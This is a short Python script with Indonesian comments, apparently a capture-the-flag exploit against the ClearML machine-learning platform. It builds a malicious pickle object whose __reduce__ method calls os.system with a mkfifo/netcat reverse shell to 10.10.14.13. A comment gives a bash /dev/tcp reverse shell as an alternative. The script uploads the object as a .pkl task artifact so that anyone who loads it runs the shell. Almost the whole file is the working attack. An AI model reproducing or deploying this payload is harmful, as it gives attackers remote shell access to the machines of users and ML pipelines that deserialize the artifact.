import pickle, os

class RunCommand:
    def __reduce__(self):
        return (os.system, ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.13 5245 >/tmp/f',))
        # Menggunakan os.system untuk menjalankan perintah shell reverse shell
        # Alternatif lain: bisa gunakan /bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.12/9000 0>&1"

Command = RunCommand()

from clearml import Task

            
  
# Mengimpor Task dari pustaka clearml

task = Task.init(project_name='draven', task_name='draven5', tags=['review'])
# Menginisialisasi tugas ClearML (atau mengaitkan dengan tugas yang sudah ada)

# Mengunggah objek command sebagai artefak, yang akan diserialisasi menjadi file .pkl
task.upload_artifact(name='pickle_artifact', artifact_object=Command, retries=2, wait_on_upload=True, extension_name='.pkl')
